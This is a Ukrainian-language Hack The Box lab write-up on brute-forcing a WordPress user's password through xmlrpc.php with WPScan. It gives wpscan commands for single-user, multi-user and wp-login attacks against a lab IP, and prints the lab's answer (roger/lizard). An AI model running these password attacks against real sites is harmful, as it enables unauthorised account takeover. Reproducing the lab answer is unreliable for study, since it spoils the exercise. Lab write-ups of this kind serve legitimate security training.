# Attacking WordPress Users (Bruteforce via XML-RPC)

## Ціль

- Забрутфорсити пароль користувача WordPress.
- Використати швидку атаку через `xmlrpc.php` замість звичайної форми логіна.
- На HTB: знайти пароль користувача `roger` → `lizard`.

---

## Крок 1 — Підготовка

```bash
export TARGET="http://154.57.164.73:31372"
WORDLIST="/usr/share/wordlists/rockyou.txt"
Переконуємось, що xmlrpc.php доступний:

bash
curl -s $TARGET/xmlrpc.php
# Очікуємо щось типу: "XML-RPC server accepts POST requests only."
Крок 2 — Bruteforce через WPScan (xmlrpc)
Атака на одного користувача roger:

bash
wpscan \
  --url $TARGET \
  --password-attack xmlrpc \
  -U roger \
  -P $WORDLIST \
  -t 20
Ключові параметри:

--password-attack xmlrpc — використовує XML-RPC замість форми логіну.

-U — ім’я користувача.

-P — wordlist.

-t — кількість потоків.

Крок 3 — Інтерпретація результату
Фрагмент важливого виводу:

text
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - roger / lizard

[!] Valid Combinations Found:
 | Username: roger, Password: lizard
Отже:

логін: roger

пароль: lizard

На HTB у полі відповіді вводимо: lizard.

Корисні варіації
Кілька користувачів
bash
wpscan \
  --url $TARGET \
  --password-attack xmlrpc \
  -U users.txt \
  -P $WORDLIST \
  -t 20
де users.txt:

text
admin
roger
wp-user
Через форму логіна (якщо треба)
bash
wpscan \
  --url $TARGET \
  --password-attack wp-login \
  -U roger \
  -P $WORDLIST \
  -t 5
